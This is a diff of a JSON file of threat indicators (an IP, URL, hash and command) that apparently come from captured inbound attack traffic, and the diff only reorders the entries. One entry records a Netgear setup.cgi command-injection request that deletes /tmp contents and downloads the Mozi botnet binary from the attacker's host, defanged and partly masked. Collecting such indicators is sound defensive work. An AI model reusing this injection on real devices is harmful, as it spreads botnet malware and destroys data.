@@ -1,26 +1,26 @@
 [
   {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "115.42.75.XXX"
-  },
-  {
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
     "value": "hxxp://115.42.75.XXX:44616/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
   },
   {
-    "context": "Inbound payload hash (unknown)",
+    "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
-    "type": "hash",
-    "value": "7ff830d9276b1f38146a1ee8c21417483001a78e6ff7445201cbad491ac370c3"
+    "type": "ip",
+    "value": "115.42.75.XXX"
   },
   {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
     "value": "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://115.42.75.XXX:44616/Mozi.m+-O+/tmp/netgea"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "7ff830d9276b1f38146a1ee8c21417483001a78e6ff7445201cbad491ac370c3"
   }
 ]
